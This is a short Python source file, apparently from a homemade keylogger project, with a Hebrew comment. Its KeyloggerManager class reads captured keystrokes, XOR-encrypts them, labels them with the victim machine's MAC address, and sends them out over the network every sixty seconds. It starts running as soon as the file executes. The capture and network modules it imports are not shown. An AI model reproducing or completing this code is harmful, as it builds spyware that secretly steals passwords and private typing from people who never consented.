from keylogger_service import KeyloggerService
from encryptor import Encryptor
from file_wirter import FileWriter
from network_writer import NetworkWriter
from getmac import get_mac_address
import getmac
import time

class KeyloggerManager:

    def __init__(self):
        self.active = True
        self.keylogger = KeyloggerService()
        self.encryptor = Encryptor()
        self.file_writer = FileWriter()
        #
        self.network_writer = NetworkWriter()
        #
        self.main()

    def main(self):
        while self.active:
            data = self.keylogger.data
            data = self.encryptor.xor(data)
            # אולי עדיף להצפין גם את הכתובת מאק
            mac_name = self.get_mac_details()
            wrapper = {"mac_name" : mac_name,
                       "data" : data}
            self.network_writer.send_data(wrapper)
            time.sleep(60)

    @staticmethod
    def get_mac_details():
        return get_mac_address()

    def stop(self):
        self.active = False

key = KeyloggerManager()

